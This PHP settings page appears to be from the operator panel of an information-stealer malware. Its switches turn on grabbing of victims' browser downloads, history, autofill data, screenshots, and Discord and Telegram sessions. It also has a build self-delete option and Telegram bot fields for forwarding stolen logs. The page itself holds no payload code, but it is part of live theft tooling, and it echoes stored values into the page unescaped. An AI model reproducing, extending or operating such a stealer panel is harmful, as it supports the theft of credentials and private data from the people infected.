<?php
include("./header.php");
?>


<!-- Page Content-->
<div class="page-content">
    <div class="container">
        <!-- Page-Title -->
        <div class="row">
            <div class="col-sm-12">
                <div class="page-title-box">
                    <div class="row">
                        <div class="col">
                            <h4 class="page-title">Settings</h4>
                            <ol class="breadcrumb">


                            </ol>
                        </div>
                        <!--end col-->
                    </div>
                    <!--end row-->
                </div>
                <!--end page-title-box-->
            </div>
            <!--end col-->
        </div>
        <!--end row-->
        <!-- end page title end breadcrumb -->
        <div class="row">
            <div class="col-12">
                <div class="card">
                    <!--end card-header-->
                    <div class="card-body">
					<table class="table table-bordered dt-responsive nowrap" style="border-collapse: collapse; border-spacing: 0; width: 100%;">
                            <thead>
                                <tr>
                                    <th style="width: 150px;">Name</th>

                                    <th style="width: 150px;">Action</th>
                                </tr>
                            </thead>

							<tr>
									<th colspan="2">Panel settings</th>
							</tr>
                            <tbody>
                                <tr>
									<td>Enable dublicates</td>
									<td>
										<div class="custom-control custom-switch switch-primary">
											<input type="checkbox" class="custom-control-input" id="dublCheckbox" <?php 
												$settings = R::load('settings', 1);
												if($settings["dublicates"] == "1")
												{
													echo 'checked="checked"';
												}

											?> data-parsley-multiple="groups" data-parsley-mincheck="2">
											<label class="custom-control-label" for="dublCheckbox">Dublicates</label>
										</div>
									</td>
								</tr>
								<tr>
									<td>Clear database</td>
									<td><button type="submit" id="clearDB" class="btn btn-sm btn-block btn-outline-info">Clear</button></td>
								</tr>

								<tr>
									<th colspan="2">Telegram bot settings</th>
								</tr>
								<tr>
									<td>Enable telegram bot</td>
									<td>
										<div class="custom-control custom-switch switch-primary">
											<input type="checkbox" class="custom-control-input" id="botCheckbox" <?php 
												
												if($settings["bot_enable"] == "1")
												{
													echo 'checked="checked"';
												}

											?> data-parsley-multiple="groups" data-parsley-mincheck="2">
											<label class="custom-control-label" for="botCheckbox">Bot enable</label>
										</div>
									</td>
								</tr>
								<tr>
									<td>Telegram bot token</td>
									<td><div class="input-group">
                                            <textarea class="form-control" rows="1" style="margin-top: 0px; margin-bottom: 0px; width: 80px;"><?php echo $settings["bot_token"] ?></textarea>
                                            <span class="">
												<button class="btn_saveToken btn btn-outline-success btn-sm" type="button">
													<svg width="24" height="24" 
														viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
														stroke-linecap="round" stroke-linejoin="round" class="feather feather-save" 
														style="width:20px;">
															<path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"></path>
															<polyline points="17 21 17 13 7 13 7 21"></polyline>
															<polyline points="7 3 7 8 15 8"></polyline>
													</svg>
												</button>
                                            </span>
                                        </div></td>
								</tr>
								<tr>
									<td>Telegram chat ID</td>
									<td><div class="input-group">
                                            <textarea class="form-control" rows="1" style="margin-top: 0px; margin-bottom: 0px; width: 80px;"><?php echo $settings["chatid"] ?></textarea>
                                            <span class="">
												<button class="btn_saveChatid btn btn-outline-success btn-sm" type="button">
													<svg width="24" height="24" 
														viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
														stroke-linecap="round" stroke-linejoin="round" class="feather feather-save" 
														style="width:20px;">
															<path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"></path>
															<polyline points="17 21 17 13 7 13 7 21"></polyline>
															<polyline points="7 3 7 8 15 8"></polyline>
													</svg>
												</button>
                                            </span>
                                        </div>
									</td>
									
								</tr>
								<tr>
									<td>Send screenshots on bot</td>
									<td>
										<div class="custom-control custom-switch switch-primary">
											<input type="checkbox" class="logsCheckbox custom-control-input" id="screentgCheckbox" <?php 
												
												if($settings["bot_scr"] == "1")
												{
													echo 'checked="checked"';
												}

											?> data-parsley-multiple="groups" data-parsley-mincheck="2">
											<label class="custom-control-label" for="screentgCheckbox">Screenshots enable</label>
										</div>
									</td>
								</tr>
								<tr>
									<th colspan="2">Soft Configuration</th>
								</tr>

								<tr>
									<td>Downloads</td>
									<td>
										<div class="custom-control custom-switch switch-primary">
											<input type="checkbox" class="grabCheckbox custom-control-input" id="downloadsCheckbox" <?php 
												
												if($settings["grab_downloads"] == "1")
												{
													echo 'checked="checked"';
												}

											?> data-parsley-multiple="groups" data-parsley-mincheck="2">
											<label class="custom-control-label" for="downloadsCheckbox">Enable</label>
										</div>
									</td>
								</tr>
								<tr>
									<td>History</td>
									<td>
										<div class="custom-control custom-switch switch-primary">
											<input type="checkbox" class="grabCheckbox custom-control-input" id="historyCheckbox" <?php 
												
												if($settings["grab_history"] == "1")
												{
													echo 'checked="checked"';
												}

											?> data-parsley-multiple="groups" data-parsley-mincheck="2">
											<label class="custom-control-label" for="historyCheckbox">Enable</label>
										</div>
									</td>
								</tr>
								<tr>
									<td>Autofill</td>
									<td>
										<div class="custom-control  custom-switch switch-primary">
											<input type="checkbox" class="grabCheckbox custom-control-input" id="autofillCheckbox" <?php 
												
												if($settings["grab_autofill"] == "1")
												{
													echo 'checked="checked"';
												}

											?> data-parsley-multiple="groups" data-parsley-mincheck="2">
											<label class="custom-control-label" for="autofillCheckbox">Enable</label>
										</div>
									</td>
								</tr>
								<tr>
									<td>Screenshot</td>
									<td>
										<div class="custom-control custom-switch switch-primary">
											<input type="checkbox" class="grabCheckbox custom-control-input" id="screenshotCheckbox" <?php 
												
												if($settings["grab_screenshot"] == "1")
												{
													echo 'checked="checked"';
												}

											?> data-parsley-multiple="groups" data-parsley-mincheck="2">
											<label class="custom-control-label" for="screenshotCheckbox">Enable</label>
										</div>
									</td>
								</tr>
								<tr>
									<td>Discord</td>
									<td>
										<div class="custom-control custom-switch switch-primary">
											<input type="checkbox" class="grabCheckbox custom-control-input" id="discordCheckbox" <?php 
												
												if($settings["grab_discord"] == "1")
												{
													echo 'checked="checked"';
												}

											?> data-parsley-multiple="groups" data-parsley-mincheck="2">
											<label class="custom-control-label" for="discordCheckbox">Enable</label>
										</div>
									</td>
								</tr>
								<tr>
									<td>Telegram</td>
									<td>
										<div class="custom-control custom-switch switch-primary">
											<input type="checkbox" class="grabCheckbox custom-control-input" id="telegramCheckbox" <?php 
												
												if($settings["grab_telegram"] == "1")
												{
													echo 'checked="checked"';
												}

											?> data-parsley-multiple="groups" data-parsley-mincheck="2">
											<label class="custom-control-label" for="telegramCheckbox">Enable</label>
										</div>
									</td>
								</tr>
								<tr>
									<td>Build self-delete</td>
									<td>
										<div class="custom-control custom-switch switch-primary">
											<input type="checkbox" class="grabCheckbox custom-control-input" id="selfdeleteCheckbox" <?php 
												
												if($settings["selfdelete"] == "1")
												{
													echo 'checked="checked"';
												}

											?> data-parsley-multiple="groups" data-parsley-mincheck="2">
											<label class="custom-control-label" for="selfdeleteCheckbox">Enable</label>
										</div>
									</td>
								</tr>
								
								
								<tr>
									<th colspan="2">Logs Page Configuration</th>
								</tr>
								
								<tr>
									<td>Comment column</td>
									<td>
										<div class="custom-control custom-switch switch-primary">
											<input type="checkbox" class="logsCheckbox custom-control-input" id="commentCheckbox" <?php 
												
												if($settings["logs_comment"] == "1")
												{
													echo 'checked="checked"';
												}

											?> data-parsley-multiple="groups" data-parsley-mincheck="2">
											<label class="custom-control-label" for="commentCheckbox">Enable</label>
										</div>
									</td>
								</tr>
								<tr>
									<td>Data column</td>
									<td>
										<div class="custom-control custom-switch switch-primary">
											<input type="checkbox" class="logsCheckbox custom-control-input" id="dataCheckbox" <?php 
											
												if($settings["logs_data"] == "1")
												{
													echo 'checked="checked"';
												}

											?> data-parsley-multiple="groups" data-parsley-mincheck="2">
											<label class="custom-control-label" for="dataCheckbox">Enable</label>
										</div>
									</td>
								</tr>
								<tr>
									<td>Marker column</td>
									<td>
										<div class="custom-control custom-switch switch-primary">
											<input type="checkbox" class="logsCheckbox custom-control-input" id="markerCheckbox" <?php 
												
												if($settings["logs_marker"] == "1")
												{
													echo 'checked="checked"';
												}

											?> data-parsley-multiple="groups" data-parsley-mincheck="2">
											<label class="custom-control-label" for="markerCheckbox">Enable</label>
										</div>
									</td>
								</tr>
								<tr>
									<td>IP column</td>
									<td>
										<div class="custom-control custom-switch switch-primary">
											<input type="checkbox" class="logsCheckbox custom-control-input" id="ipCheckbox" <?php 
												
												if($settings["logs_ip"] == "1")
												{
													echo 'checked="checked"';
												}

											?> data-parsley-multiple="groups" data-parsley-mincheck="2">
											<label class="custom-control-label" for="ipCheckbox">Enable</label>
										</div>
									</td>
								</tr>
								<tr>
									<td>Screenshot column</td>
									<td>
										<div class="custom-control custom-switch switch-primary">
											<input type="checkbox" class="logsCheckbox custom-control-input" id="screenshot2Checkbox" <?php 
												
												if($settings["logs_screenshot"] == "1")
												{
													echo 'checked="checked"';
												}

											?> data-parsley-multiple="groups" data-parsley-mincheck="2">
											<label class="custom-control-label" for="screenshot2Checkbox">Enable</label>
										</div>
									</td>
								</tr>
								<tr>
									<td>Actions column</td>
									<td>
										<div class="custom-control custom-switch switch-primary">
											<input type="checkbox" class="logsCheckbox custom-control-input" id="actionsCheckbox" <?php 
												
												if($settings["logs_actions"] == "1")
												{
													echo 'checked="checked"';
												}

											?> data-parsley-multiple="groups" data-parsley-mincheck="2">
											<label class="custom-control-label" for="actionsCheckbox">Enable</label>
										</div>
									</td>
								</tr>
								<tr>
									<td>Date column</td>
									<td>
										<div class="custom-control custom-switch switch-primary">
											<input type="checkbox" class="logsCheckbox custom-control-input" id="dateCheckbox" <?php 
												
												if($settings["logs_date"] == "1")
												{
													echo 'checked="checked"';
												}

											?> data-parsley-multiple="groups" data-parsley-mincheck="2">
											<label class="custom-control-label" for="dateCheckbox">Enable</label>
										</div>
									</td>
								</tr>
							</tbody>
                        </table>


                    </div>
                </div>

            </div> <!-- end col -->
        </div> <!-- end row -->

    </div><!-- container -->

    <?php
include("./footer.php");



?>
    <!--end footer-->
</div>
<!-- end page content -->
</div>
<!-- end page-wrapper -->




<!-- jQuery  -->
<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.bundle.min.js"></script>
<script src="assets/js/metismenu.min.js"></script>
<script src="assets/js/waves.js"></script>
<script src="assets/js/feather.min.js"></script>
<script src="assets/js/simplebar.min.js"></script>
<script src="assets/js/moment.js"></script>

<!-- Plugins js -->
<script src="assets/js/select2.min.js"></script>

<script src="assets/js/jquery.forms-advanced.js"></script>

<!-- App js -->
<script src="assets/js/app.js"></script>

<!-- Page js -->
<script src="includes/settingsactions.js"></script>

</body>

</html>